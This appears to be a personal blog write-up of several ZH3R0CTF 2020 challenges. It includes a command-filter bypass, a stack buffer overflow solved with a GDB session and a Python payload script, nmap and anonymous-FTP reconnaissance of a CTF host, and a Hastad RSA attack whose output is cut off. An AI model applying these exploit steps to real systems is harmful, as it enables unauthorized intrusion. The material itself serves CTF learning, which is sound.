---
title: "ZH3R0CTF 2020"
date: 2020-06-18T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["ctf", "writeup", "compete", "zh3r0ctf"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "A writeup of some challeges for ZH3R0CTF 2020"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
cover:
    image: "zh3r0ctf_logo.png" # image path/url
    alt: "Zero CTF Logo" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---


> **Dates:** June 15th - June 17th 2020
>
> **Team Members:**
> - itsecgary
> - birch

https://ctftime.org/event/1062


---


## (binexp) Command-1
**Category:** Binary Exploitation

**Points:** 227

**Description:**
> **Given:** command_1

### Writeup
To start, I went ahead and ran the function to see what we are dealing with.
```
$ ./command_1
Please enter your name: itsecgary
Hello itsecgary

-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
```

Looks like we have a menu with some options. After looking through some of the
options and playing with the options in the menu, I opened it up in **Ghidra**
to do a closer analysis of what is happening. Here are some functions we see:

**main**
```
void main(EVP_PKEY_CTX *param_1) {
  int iVar1;

  init(param_1);
  printf("Please enter your name: ");
  read(0,name,0x10);
  printf("Hello %s\n",name);
  do {
    while( true ) {
      while( true ) {
        menu();
        iVar1 = number();
        if (iVar1 != 2) break;
        runcommand();
      }
      if (2 < iVar1) break;
      if (iVar1 == 1) {
        addcommand();
      }
      else {
LAB_00400ec5:
        puts("I don\'t see where you are going.");
      }
    }
    if (iVar1 != 3) {
      if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_00400ec5;
    }
    editcommand();
  } while( true );
}
```

**addcommand**
```
void addcommand(void) {
  char *pcVar1;
  char *__dest;
  long in_FS_OFFSET;
  char *local_30;
  char local_1a [10];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter the command you want to add.");
  printf("> ");
  read(0,local_1a,10);
  pcVar1 = strstr(local_1a,"flag");
  if ((((pcVar1 != (char *)0x0) || (pcVar1 = strstr(local_1a,"/bin"), pcVar1 != (char *)0x0)) ||
      (pcVar1 = strstr(local_1a,"sh"), pcVar1 != (char *)0x0)) ||
     (((pcVar1 = strstr(local_1a,"echo"), pcVar1 != (char *)0x0 ||
       (pcVar1 = strstr(local_1a,"cat"), pcVar1 != (char *)0x0)) ||
      ((pcVar1 = strstr(local_1a,"shutdown"), pcVar1 != (char *)0x0 ||
       (pcVar1 = strstr(local_1a,"init 0"), pcVar1 != (char *)0x0)))))) {
    puts("I don\'t see where you are going you idiot");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  if ((int)ind < 3) {
    __dest = (char *)malloc(0x18);
    *(undefined8 *)(__dest + 0x10) = 0;
    strncpy(__dest,local_1a,4);
    pcVar1 = __dest;
    if (head != (char *)0x0) {
      local_30 = head;
      while (*(long *)(local_30 + 0x10) != 0) {
        local_30 = *(char **)(local_30 + 0x10);
      }
      *(char **)(local_30 + 0x10) = __dest;
      pcVar1 = head;
    }
    head = pcVar1;
    printf("Command added at index [%d]\n.",(ulong)ind);
    *(char **)(magic + (long)(int)ind * 8) = __dest;
    ind = ind + 1;
  }
  else {
    printf("No more space you idiot\n.");
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

**editcommand**
```
void editcommand(void) {
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_48;
  char *local_40;
  char local_38 [40];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0;
  puts("Enter index you want to edit: ");
  iVar1 = number();
  if (((iVar1 < 0) || (2 < iVar1)) || (*(long *)(magic + (long)iVar1 * 8) == 0)) {
    puts("Oops don\'t hack me please.");
  }
  else {
    local_40 = head;
    while (local_48 != iVar1) {
      local_40 = *(char **)(local_40 + 0x10);
      local_48 = local_48 + 1;
    }
    printf("Enter new command -> ");
    sVar2 = read(0,local_38,0x18);
    if (sVar2 < 0) {
      puts("You must be unlucky.");
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    strcpy(local_40,local_38);
    puts("Command edited.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

**runcommand**
```
void runcommand(void) {
  int iVar1;
  int local_18;
  char *local_10;

  local_18 = 0;
  puts("So you want to run the command:");
  printf("Enter the index of the command: ");
  iVar1 = number();
  if (((iVar1 < 0) || (2 < iVar1)) || (*(long *)(magic + (long)iVar1 * 8) == 0)) {
    puts("What do you want to run you idiot.");
  }
  else {
    local_10 = head;
    while (local_18 != iVar1) {
      local_10 = *(char **)(local_10 + 0x10);
      local_18 = local_18 + 1;
    }
    system(local_10);
  }
  return;
}
```

My apologies for all of the code dumping here, but it is important to see that
the **addcommand()** function checks the input and filters out specific commands that
would be useful to show the flag. The **runcommand()** function simply just runs
the function. The **editcommand()** function edits the command *WITHOUT* sanitizing.

This allows us to add a command, edit that command to whatever we want (probably
  'cat flag.txt') and run that command.

```
$ nc us.pwn.zh3r0.ml 8520
Please enter your name: itsecgary
Hello itsecgary

-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 1
Enter the command you want to add.
> poopoo
Command added at index [0]
.-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 3
Enter index you want to edit:
0
Enter new command -> cat flag.txt
Command edited.
-------------------
1.) Add command.
2.) Run command.
3.) Edit command.
4.) Exit.
> 2
So you want to run the command:
Enter the index of the command: 0
zh3r0{the_intended_sol_useoverflow_change_nextpointer_toFakechunk_in_bssname}
```

### Flag
zh3r0{the_intended_sol_useoverflow_change_nextpointer_toFakechunk_in_bssname}

### Resources
Ghidra - https://ghidra-sre.org/


---


## (binexp) Free Flag
**Category:** Binary Exploitation

**Points:** 124

**Description:**
> Welcome to zh3r0 ctf
> Here's your free flag
>
> pwn.zh3r0.ml 3456
>
> **Author:** hk
>
> **Given:** file: chall

### Writeup
To start off, let's run the program and see if we can work with some input:
```
nc pwn.zh3r0.ml 3456
Welcome to zh3r0 ctf.
Please provide us your name:
itsecgary

```

Looks like we have to enter a *"name"* and it will give us the flag somehow.
The next step here is to take a closer look at the binary file given to us. I will
use **Ghidra** (tool from the NSA) to decompile the program.

Opening up our function list, we see some potential functions to take a peek at:
- main
- here
- winwin

Let's see what they have:
**main:**
```
undefined8 main(EVP_PKEY_CTX *param_1) {
  init(param_1);
  here();
  return 0;
}
```

**here**
```
void here(void) {
  ssize_t sVar1;
  undefined local_28 [32];

  puts("Welcome to zh3r0 ctf.");
  puts("Please provide us your name: ");
  sVar1 = read(0,local_28,0x38);
  if (sVar1 == 0) {
    puts("Unlucky:-------- ): ");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  return;
}
```

**winwin**
```
void win_win(void) {
  system("cat flag.txt");
  return;
}
```

Looking at these functions we see that main() calls here() so our function here
really starts in here(). In here() we see that it takes in an input of 0x38 size,
which is a maximum of 54 characters accepted. After that, it doesn't really do
much besides exit the program. Hmmmm...

Our winwin() function looks like it gives us the flag, which sets out goal to be
able to run the code in that function. This is where we can use a **buffer
overflow**. Now, if you don't know what that is, watch the videos
linked down below to get a little understanding of what it is and how it works.

At this point, I used **GDB** to help me look at the stack during execution. For
the input, I will use a string of characters to help me determine the length I
need to set my payload and where I will need to inject the address to the winwin()
function.

**alphabet**
```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

To start, I am going to set a breakpoint at the return value of main (practically
the end of the program). After this, I will define a hook to display the current
instruction that will be executed and examine 16 words from the stack.
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004007d9 <+0>:     push   %rbp
   0x00000000004007da <+1>:     mov    %rsp,%rbp
   0x00000000004007dd <+4>:     mov    $0x0,%eax
   0x00000000004007e2 <+9>:     callq  0x40076e <init>
   0x00000000004007e7 <+14>:    mov    $0x0,%eax
   0x00000000004007ec <+19>:    callq  0x40071a <here>
   0x00000000004007f1 <+24>:    mov    $0x0,%eax
   0x00000000004007f6 <+29>:    pop    %rbp
   0x00000000004007f7 <+30>:    retq
End of assembler dump.

(gdb) break *0x00000000004007f7
Breakpoint 1 at 0x4007f7

(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $rip
>x/8wx $rsp
>end
```  

Now I will run through the program with what we came up with above.
```
(gdb) r
Starting program: /home/gary/ctfs/zh3r0_CTF2020/binary_exploitation/free_flag/chall
Welcome to zh3r0 ctf.
Please provide us your name:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
=> 0x40076d <here+83>:  retq
0x7ffffffee128: 0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e
0x7ffffffee138: 0xff5c70b3      0x00007fff      0xff7dd620      0x00007fff
0x000000000040076d in here ()
(gdb) OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Undefined command: "OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ".  Try "help".
```

Hmm okay interesting. Looks like it only accepted up to our N's *(0x4e)*.
But the interesting thing here is that we can set the new return address to be
whatever we want where the K's *(0x4b)* are.

Let's change our input here a little bit. Next thing to do is grab the address
of the win_win() funciton where it begins.
```
(gdb) disassemble win_win
Dump of assembler code for function win_win:
   0x0000000000400707 <+0>:     push   %rbp
   0x0000000000400708 <+1>:     mov    %rsp,%rbp
   0x000000000040070b <+4>:     lea    0x172(%rip),%rdi        # 0x400884
   0x0000000000400712 <+11>:    callq  0x4005d0 <system@plt>
   0x0000000000400717 <+16>:    nop
   0x0000000000400718 <+17>:    pop    %rbp
   0x0000000000400719 <+18>:    retq
End of assembler dump.
```

I wrote a few lines of code to let us encode the function address into chars.
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ"
eip = struct.pack("I", 0x0040070b)
payload = struct.pack("I", 0x00000000)
print(padding+eip+payload)
```

**alphabet**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
```

Let's give this a shot.
```
$ ./chall < alphabet
Welcome to zh3r0 ctf.
Please provide us your name:
cat: flag.txt: No such file or directory
```

NICE! Looks like it reaches the part of the code where it returns the flag.
Let's connect to the service and get this flag.
```
$ nc pwn.zh3r0.ml 3456 < alphabet
Welcome to zh3r0 ctf.
Please provide us your name:
zh3r0{welcome_to_zh3r0_ctf}
```

### Flag
zh3r0{welcome_to_zh3r0_ctf}

### Resources
Ghidra - https://ghidra-sre.org/

Videos
- https://www.youtube.com/watch?v=akCce7vSSfw
- https://www.youtube.com/watch?v=HSlhY4Uy8SA&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- https://www.youtube.com/watch?v=1S0aBV-Waeo

These videos really helped me understand how buffer overflows occur and how to
exploit them :)


---


## (pwnable) HTB
**Category:** Hack The Box

**Number of flags:** 8 total

**Description:**
> Description: Here's the url ;)
>
>   hackit.zh3r0.ml
>
> **Author :** Mr.Holmes


### Writeup
This was a pretty unique challenge set for a CTF competition. Despite the fact
most players get a lot of practice from the HackTheBox website and their
challenges, we don't see too many of them for a CTF.

For those who know, **Nmap** is practically the first tool that comes to mind when
*only* given a host. You can find links in the *Resources* section below. Kali
has this loaded already, but for linux, it's a quick install. I also realized that it
isn't possible on Windows Subsystem for Linux :( #rip

I personally used Zenmap for Windows because it is what I had at the time. here
is the command I ran:
```
nmap -sC -sV -p- hackit.zh3r0.ml
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 09:25 Eastern Daylight Time
Nmap scan report for 139.59.3.42
Host is up (0.27s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE  VERSION
22/tcp    open     http     PHP cli server 5.5 or later
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)

99/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 70:78:8f:70:79:59:72:5f:05:c9:2a:63:b4:34:c1:52 (RSA)
|   256 08:6d:42:16:2a:47:ae:b4:d7:fa:35:28:91:67:ab:63 (ECDSA)
|_  256 e4:89:6b:09:37:64:c2:47:01:bd:c2:32:d8:cd:06:2d (ED25519)

324/tcp   open     ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:173.120.119.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

4994/tcp  open     unknown
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions:
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|     Heyo, Watcha looking at? Employee ID yoo! :
|     away kiddo, huh, Kids these days!
|   NULL:
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     ||Employee Entry||
|     ----------------------------------------------------------
|     Sherlock Holmes Inc.
|     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
|     Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
|_    Heyo, Watcha looking at? Employee ID yoo! :

11211/tcp filtered memcache
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4994-TCP:V=7.80%I=7%D=6/18%Time=5EEB6FE7%P=i686-pc-windows-windows%
SF:r(NULL,18C,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\|\|Employee\x20Entry\|\|\n\n--------------------------
SF:--------------------------------\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherlock\x20Holmes\x20In
SF:c\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's
SF:\x20a\x20free\x20flag\x20for\x20you,\x20just\x20for\x20finding\x20this\
SF:x20door!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x2
SF:0looking\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\n")%r(GenericLines,
SF:1B1,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:0\x20\x20\|\|Employee\x20Entry\|\|\n\n---------------------------------
SF:-------------------------\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherlock\x20Holmes\x20Inc\.\n~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's\x20a\x
SF:20free\x20flag\x20for\x20you,\x20just\x20for\x20finding\x20this\x20door
SF:!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x20lookin
SF:g\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\nGo\x20away\x20kiddo,\x20h
SF:uh,\x20Kids\x20these\x20days!\n")%r(GetRequest,1B1,"\n~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\|Employee\x2
SF:0Entry\|\|\n\n---------------------------------------------------------
SF:-\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Sherlock\x20Holmes\x20Inc\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nHere's\x20a\x20free\x20flag\x20for\x2
SF:0you,\x20just\x20for\x20finding\x20this\x20door!\x20Flag\x201:\x20zh3r0
SF:{pr05_d0_full_sc4n5}\nHeyo,\x20Watcha\x20looking\x20at\?\x20Employee\x2
SF:0ID\x20yoo!\x20:\x20\nGo\x20away\x20kiddo,\x20huh,\x20Kids\x20these\x20
SF:days!\n")%r(HTTPOptions,1B1,"\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~~~~~~~~~~\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\|\|Employee\x20Entry\|\|\n\n---------
SF:-------------------------------------------------\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Sherloc
SF:k\x20Holmes\x20Inc\.\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SF:~~~~~~~~~\nHere's\x20a\x20free\x20flag\x20for\x20you,\x20just\x20for\x2
SF:0finding\x20this\x20door!\x20Flag\x201:\x20zh3r0{pr05_d0_full_sc4n5}\nH
SF:eyo,\x20Watcha\x20looking\x20at\?\x20Employee\x20ID\x20yoo!\x20:\x20\nG
SF:o\x20away\x20kiddo,\x20huh,\x20Kids\x20these\x20days!\n");
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1391.93 seconds
```

We see a lot of information here. Where to start!

Let's start with port **22**. The information given to us in the output suggests that
there is a website standing on this port, which is odd considering **22** is
reserved for SSH.

I went ahead and ran a curl on the website on port 22:
```
$ curl hackit.zh3r0.ml:22
z3hr0{shouldve_added_some_filter_here}
```

Sweet. First flag!

Let's now take a look at port **324**. The information from our output shows us
that FTP is running at this port. This is not usual as well because FTP's default
and reserved protocol is *21*. We also notice that "Anonymous login" is enabled
for FTP, which means we can login as **anonymous** with an empty password and
poke around.
```
$ ftp hackit.zh3r0.ml 324
Connected to hackit.zh3r0.ml.
220 (vsFTPd 3.0.3)
Name (hackit.zh3r0.ml:itsecgary): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> _
```

Now we are logged in. Typing *help* is a good way to see what commands we can run.
```
ftp> help
Commands may be abbreviated.  Commands are:

!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         runique
debug           macdef          proxy           send
ftp> _
```

Nice. Let's try some:
```
ftp> dir
500 Illegal PORT command.
425 Use PORT or PASV first.
ftp> ls
500 Illegal PORT command.
ftp> _
```

Looks like an illegal command. After doing some research, I learned that being in
passive passes these commands through.
```
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,143,73).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ...
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,159,1).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 18 09:06 ...
-rw-r--r--    1 ftp      ftp            46 Jun 18 09:06 .stayhidden
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (139,59,3,42,233,178).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 18 09:06 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 18 09:06 ..
-rw-r--r--    1 ftp      ftp            34 Jun 18 09:06 .flag
-rw-r--r--    1 ftp      ftp            22 Jun 18 09:06 test.txt
226 Directory send OK.
ftp>
```

Looks like we have a couple files!! **..** is for the directory before and **.**
is for the current directory. They tried to be sneaky with the **...** directory.
We can retrieve these files using ` get <file> <new_file_name> `, which tranfers
these files to our machine (hence File Transfer Protocol). I grabbed each of the
*test.txt* files and renamed them as test1, test2, and test3 in case they were
different content-wise.

Let's see what we are working with:
```
$ ls -la
total 0
drwxrwxrwx 1 gary gary 512 Jun 18 09:09 .
drwxrwxrwx 1 gary gary 512 Jun 18 09:09 ..
-rw-rw-rw- 1 gary gary  34 Jun 18 09:05 .flag
-rw-rw-rw- 1 gary gary  46 Jun 18 09:08 .stayhidden
-rw-rw-rw- 1 gary gary  22 Jun 18 09:06 test1
-rw-rw-rw- 1 gary gary  22 Jun 18 09:07 test2
-rw-rw-rw- 1 gary gary  22 Jun 18 09:09 test3

$ cat .flag
Flag 2: zh3r0{You_know_your_shit}

$ cat .stayhidden
Employee ID: 6890d90d349e3757013b02e495b1a87f

$ cat test1
LOL Nothing here. ;-;

$ cat test2
LOL Nothing here. ;-;

$ cat test3
LOL Nothing here. ;-;
```

Welp we got another flag. *Note:* While writing this writeup, I didn't realize
there was another **...** directory in the first **...** directory so I only
extracted the first two *test.txt* files and the *.stayhidden* file so #rip me
for missing out on 419 points lol. We also retrieved an *Employee ID* which may
be useful later!

Let's take a look at the open port on **4994**

```
$ nc hackit.zh3r0.ml 4994

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     ||Employee Entry||

----------------------------------------------------------
                     Sherlock Holmes Inc.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Here's a free flag for you, just for finding this door! Flag 1: zh3r0{pr05_d0_full_sc4n5}
Heyo, Watcha looking at? Employee ID yoo! :
6890d90d349e3757013b02e495b1a87f
Hey I know you! You work here!
Books are a uniquely portable magic. - Stephen King

Flag 4: zh3r0{y0ur_s4l4ry_wa5_cr3dit3d}
```

Looks like they gave us a flag right away. We also got a prompt for the Employee
ID, which is what we found above. After entering it in, we get Flag 4!

This is all I found for these challenges. Flags **3**, **6**, **7**, and **8**
were all somewhere on the host. https://github.com/sidchn/zh3r0CTF-writeup is
another writeup that kind of hits on Flags **3** and **6**.


### Flags
**Flag 1:** zh3r0{pr05_d0_full_sc4n5}

**Flag 2:** zh3r0{You_know_your_shit}

**Flag 4:** zh3r0{y0ur_s4l4ry_wa5_cr3dit3d}

**Flag 5:** z3hr0{shouldve_added_some_filter_here}

### Resources
Nmap/Zenmap - https://nmap.org/download.html


---


## (crypto) Hastad's Message
**Category:** Crypto

**Points:** 411

**Description:**
> My friend Hastad send me a message but I am not able to read it. Only thing I
know is its different each time.
>
> nc crypto.zh3r0.ml 7419
>
> **Author :** Finch


### Writeup
Reading the description and thinking about the title, we can infer that this is
most likely going to be solved by **Hastad's RSA Attack**. There are some
informative resources on Hastad's Attack at the bottom if you want to read
and/or watch a video on it.

To sum it up, we need three moduli and three ciphertexts. The attack uses some
math to get a common modulus (I think). The attack also assumes the public
exponent (**e**) is equal to **3**.

The description notes that the message is different every time, which is great
because we need three different sets of moduli and ciphertexts:
```
$ nc crypto.zh3r0.ml 7419
N: 26329166984869041859634971942295508914086614756052649916715153888481838019446543659757155645116769584381237080447776835739170987527005814400394577761822009408643187035265928122611444675831972885388102505246050837141849411862111709116367913126692684315075812292118346525048043797743758647556197949162237012170765715489491252692831466048959316256355759727145883803064149037619208929139388737790411400133521644550402190755308716121097770368356659540585535532884876043170632478721624029571816011724967994226508693012935776285118552199186117433633100216881935216628735559281536730218432968021046737952051819658181259878149
CT: 13696674950433813895298041308045632529884066637106066434055761656634216946840402487500825692707297939337436811238475042408363119793161341988647831099617176608938843866551309386288691680095479772354016097889400273737533478113841958286151723116643033653995679615401212762174200830205198481421530614785072197545914307879082057254025517014619994399588859878772462750995973467253943907234301821576044216582246803850068027473821303077367989380520821734878595978138848610208844611305492117585477951318789794473666584152555731215918034102977914334062154485456843361952486458602554626960263460610725474127818677875972933875249

$ nc crypto.zh3r0.ml 7419
N: 22384216895184126503119624343320021821638233110863325898706560403197645878203817745790238197708416046618344094882982335720692685468281691146289903360608759314465378437068825261171471235483378433538257668429402907303532447870966095573819297418602601260325774195925269436319325981924076560794365192162562834753664301926653212755937853868506740496963626939832399258562954489056198250858902550995248399935612478913709617862129428374409234539923710672573540043364314100184572466402179424456471569591284089542460776340545139186988771394267096966020039348514804567035515030274507835577689524596337772418323549448243343361831
CT: 5353345346883089467141269968761525262677279170329666694797265115044928760952816917862665148190263741954651283587445076390324149524694842134461309999700504892826865511676944998156648254220372877253984503837884294212054018245851450555353751434222671390020506217356501583459507087748067302175421725020578101235352346674097473733309611211213878072286974934049276260742702782327298570150180281510979146190959585950244494373491367198797787947700591295353932747947492989216240541566454657386123685140779948477566980018178539683614588716842717894118803413424004986059577548748432511218870669050221814751292921897431242248941

$ nc crypto.zh3r0.ml 7419
N: 22424243940237609093986181521248901242782094037697873373836836736493013117260495680987607769354269320561576377180539010732084017919614407493417604713138573086392460341825569544329294333785416106775326335231740978161329178536710032114103565077914290391270889095078548028956464075135014835042893633426595475887865312994493395174535036307668304725413758492249582598657435602203689640301841897950479233122713167542454482902649867247742813614034808103280371220185593639727153149613933683852108452848538974235423325030571301060804485909616787540913079701564237236038710949156042408869849909619744500748736648228888569573589
CT: 14248998542824914719750911379086920493500471888638705238133866311748059581683708422549036932370027910990304631217481702400469486898162095317239864189584616787472445614519498539566076996422644593520710194926830242522562819000277287688504181287249564196723442838873910913236286542856580569459769886968942760506614856615797894115905258930225533376037968554243022975808731677888560753976786112293175192882447689169089532325198116284561341385989363237692683318157037034971649251468292971739244270525145089816866123381203273750512577151312036713011523059957036531932480131619100026838056618714367910138597216504150041537796
```

I used **echo** to put each value into **n1**, **n2**, **n3**, **c1**, **c2**,
and **c3**. I did this because the tool I am using passes these files in as
arguments. Now, let's run the tool:
```
$ python ~/tools/RSA-Hastad/rsaHastad.py n1 n2 n3 c1 c2 c3 -v


        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                RSA Hastad Attack
                 JulesDT -- 2016
                 License GNU/GPL
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
##
## 13696674950433813895298041308045632529884066637106066434055761656634216946840402487500825692707297939337436811238475042408363119793161341988647831099617176608938843866551309386288691680095479772354016097889400273737533478113841958286151723116643033653995679615401212762174200830205198481421530614785072197545914307879082057254025517014619994399588859878772462750995973467253943907234301821576044216582246803850068027473821303077367989380520821734878595978138848610208844611305492117585477951318789794473666584152555731215918034102977914334062154485456843361952486458602554626960263460610725474127818677875972933875249
## Guessed as decimal input
##
##
## 5353345346883089467141269968761525262677279170329666694797265115044928760952816917862665148190263741954651283587445076390324149524694842134461309999700504892826865511676944998156648254220372877253984503837884294212054018245851450555353751434222671390020506217356501583459507087748067302175421725020578101235352346674097473733309611211213878072286974934049276260742702782327298570150180281510979146190959585950244494373491367198797787947700591295353932747947492989216240541566454657386123685140779948477566980018178539683614588716842717894118803413424004986059577548748432511218870669050221814751292921897431242248941
## Guessed as decimal input
##
##
